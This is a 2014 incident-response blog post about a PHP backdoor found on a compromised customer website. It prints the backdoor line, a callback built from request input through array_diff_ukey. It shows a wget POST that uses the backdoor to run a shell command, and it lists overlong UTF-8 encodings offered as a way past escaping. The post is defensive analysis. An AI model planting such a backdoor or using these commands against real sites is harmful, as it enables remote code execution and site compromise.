<!DOCTYPE html>
<html lang="en-us">
<head>
  <title> PHP callback function backdoor &middot;  Greyhat.dk</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://www.greyhat.dk/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://www.greyhat.dk/css/main.css" />
  <link rel="stylesheet" href="https://www.greyhat.dk/css/font-awesome.min.css" />
   <link rel="stylesheet" href="https://www.greyhat.dk/css/github.css" />
   <script src="https://www.greyhat.dk/js/jquery.min.js"></script>
  <script src="https://www.greyhat.dk/js/bootstrap.min.js"></script>
</head>
<body>

    <header class="global-header" style="background-image:url( /images/bg.jpg )">
    <section class="header-text">
    <h1><a href="https://www.greyhat.dk/">Greyhat.dk</a></h1>
    <div class="sns-links hidden-print">
  
  
  <a href="https://twitter.com/Desdic" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/desdic" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  <a href="https://linkedin.com/in/kimgertnielsen" target="_blank">
    <i class="fa fa-linkedin"></i>
  </a>
  
  
  <a href="https://keybase.io/desdic" target="_blank">
    <i class="fa fa-key"></i>
  </a>
  
</div>

    <a href="https://www.greyhat.dk/index.xml" class="btn-header btn-subscribe hidden-xs"><i class="fa fa-rss" aria-hidden="true"></i>&nbsp;Subscribe</a>
    </section>
</header>

<nav class="navbar navbar-inverse">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#greyhatnavbar">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
    </div>
    <div class="collapse navbar-collapse" id="greyhatnavbar">
        <ul class="nav navbar-nav">
            
            
            <li class=""><a href="../">Home</a></li>
            
            <li class=""><a href="../about">About</a></li>
            
            <li class=""><a href="../links">Links</a></li>
            
      </ul>
    </div>
  </div>
</nav>




<main class="container">
<article>
  <header>
  <h1 class="text-primary">PHP callback function backdoor</h1>
  
    <div class="post-meta clearfix">
      <div class="post-date pull-left">
        Posted on
        <time datetime="2014-05-10T00:00:00Z">
          May 10, 2014
        </time>
      </div>
      <div class="pull-right">
        
        <span class="post-tag small"><a href="https://www.greyhat.dk//tags/backdoor">#Backdoor</a></span>
        
        <span class="post-tag small"><a href="https://www.greyhat.dk//tags/php">#PHP</a></span>
        
      </div>
  </div>
  
  </header>
  <section>
    <p>I recently had an incident at a customers website where the site was
compromised. The customer went through the code and found several SQL
injections, XSS and newly added files with backdoors (basic evals in
PHP). All vulnerabilities was fixed (According to the customer) but
about a month later the site was compromised again. Unfortunately no
version control was used so we had to go through all files to help the
customer and the log had no indications of successful attempts.</p>

<p>In several files I found code like this</p>

<pre><code class="language-php">    @array_diff_ukey(@array((string)$_REQUEST['list']=&gt;1), @array((string)stripslashes($_REQUEST['list2'])=&gt;2),$_REQUEST['var']);
</code></pre>

<p>It took me a while to fully understand what this is. This is a quite
clever backdoor and the reason why its was not detected in apaches log
is that POST was used to execute the command for compromising.</p>

<p>So in order to execute a command on the system all the attacker had to
  do was</p>

<pre><code class="language-sh">    $ wget -S -O - --post-data 'var=system&amp;list=ls' http://example.com/g.php --2014-05-10 14:23:45-- http://example.com/g.php Resolving example.com... 127.0.0.1 Connecting to example.com|127.0.0.1|:80... connected. HTTP request sent, awaiting response... HTTP/1.1 200 OK Date: Sat, 10 May 2014 12:23:45 GMT Server: Apache Connection: close Content-Type: text/html Length: unspecified [text/html] Saving to: 'STDOUT' 
    [&lt;=&gt; ] 0 --.-K/s
    cv.pdf
    g.php
    index.html
    index5.html
    [ &lt;=&gt; ] 79 --.-K/s in 0s
    2014-05-10 14:23:45 (428 KB/s) - written to stdout [79]
</code></pre>

<p>Nice directory listing :) I&rsquo;m pretty sure you can find alternative ways
to use this then listing files. But since the customer did not find this
backdoor using a review it really proves a few things.</p>

<ul>
<li>Always use version control on your software (Subversion, Git etc)</li>
<li>Always sanitize input</li>
<li>Hire developers who knows the current languages pitfalls, know how to
review code.</li>
</ul>

<p>Another thing I found was a heavy usage of the php function
mysql_real_escape_string. The function does not provide any real
security since it does not handle overlong UTF-8 chars.</p>

<pre><code class="language-sh">    ' = %27 = %c0%a7 = %e0%80%a7 = %f0%80%80%a7 
    &quot; = %22 = %c0%a2 = %e0%80%a2 = %f0%80%80%a2 
    &lt; = %3c = %c0%bc = %e0%80%bc = %f0%80%80%bc
    ; = %3b = %c0%bb = %e0%80%bb = %f0%80%80%bb 
    &amp; = %26 = %c0%a6 = %e0%80%a6 = %f0%80%80%a6 
    \0= % 00 = %c0%80 = %e0%80%80 = %f0%80%80%80
</code></pre>

<p>Â </p>

  </section>
  
  <footer>
    
    <section class="author-info row">
      <div class="author-avatar col-md-2">
        
      </div>
      <div class="author-meta col-md-6">
        
        
      </div>
      
    </section>
    <ul class="pager">
      
      <li class="previous"><a href="https://www.greyhat.dk/missing-unread-mail-count-in-the-doc-on-mac-os-x-10-9-mavericks/"><span aria-hidden="true">&larr;</span> Older</a></li>
      
      
      <li class="next"><a href="https://www.greyhat.dk/creating-facters-windows/">Newer <span aria-hidden="true">&rarr;</span></a></li>
      
    </ul>
  </footer>
  
</article>

  </main>
  <footer class="container global-footer">
    <div class="copyright-note pull-left">
      
    </div>
    <div class="sns-links hidden-print">
  
  
  <a href="https://twitter.com/Desdic" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/desdic" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  <a href="https://linkedin.com/in/kimgertnielsen" target="_blank">
    <i class="fa fa-linkedin"></i>
  </a>
  
  
  <a href="https://keybase.io/desdic" target="_blank">
    <i class="fa fa-key"></i>
  </a>
  
</div>

  </footer>

  <script src="https://www.greyhat.dk/js/highlight.pack.js"></script>
  <script>
    hljs.initHighlightingOnLoad();
  </script>
  
  
<script data-no-instant>document.write('<script src="http://'
        + (location.host || 'localhost').split(':')[0]
		+ ':/livereload.js?mindelay=10"></'
        + 'script>')</script></body>
</html>

